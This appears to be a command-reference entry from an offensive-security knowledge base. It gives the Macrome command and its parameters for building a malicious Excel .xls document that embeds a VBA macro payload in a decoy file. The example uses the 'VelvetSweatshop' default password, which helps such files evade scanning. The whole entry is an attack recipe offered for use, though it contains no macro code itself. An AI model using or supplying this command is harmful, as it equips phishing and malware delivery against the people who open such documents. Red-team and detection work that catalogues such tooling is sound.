---
id: 7630bb0f-762b-4423-bc1e-3d2d9d889dab
name: macrome-build-malicious-document
type: command
executor: bash
data: >-
  Macrome build --decoy-document $_DECOY_DOCUMENT --payload-type Macro --payload
  $_VBA_MACRO_FILE --output-file-name $_OUTPUT_FILE --password $_PASSWORD
output: null
created_at: '2023-04-06T03:56:23.232753+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - macro-generation
  - macrome
verified: true
validated: true
---

# macrome-build-malicious-document

## Command

```bash
Macrome build --decoy-document $_DECOY_DOCUMENT --payload-type Macro --payload $_VBA_MACRO_FILE --output-file-name $_OUTPUT_FILE --password $_PASSWORD
```

## Description

Builds a malicious .xls document embedding a VBA macro payload into a decoy file, protected by password.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| --decoy-document $_DECOY_DOCUMENT | Path to legitimate .xls decoy | Yes |
| --payload-type Macro | Specify VBA macro type | Yes |
| --payload $_VBA_MACRO_FILE | Path to VBA macro file (e.g., macro_example.txt) | Yes |
| --output-file-name $_OUTPUT_FILE | Output .xls name | Yes |
| --password $_PASSWORD | Document protection password | Yes |

## Examples

### Basic Usage

```bash
Macrome build --decoy-document decoy_document.xls --payload-type Macro --payload macro_example.txt --output-file-name xor_obfuscated_macro_doc.xls --password VelvetSweatshop
```

## Expected Output

Creates the specified .xls file. Console: Build success message. Open in Excel to see macro prompt.

## Related

- [[procedures/Create-Malicious-Macro-Enabled-Excel-Documents-with-Macrome]]
- [[tools/macrome]]
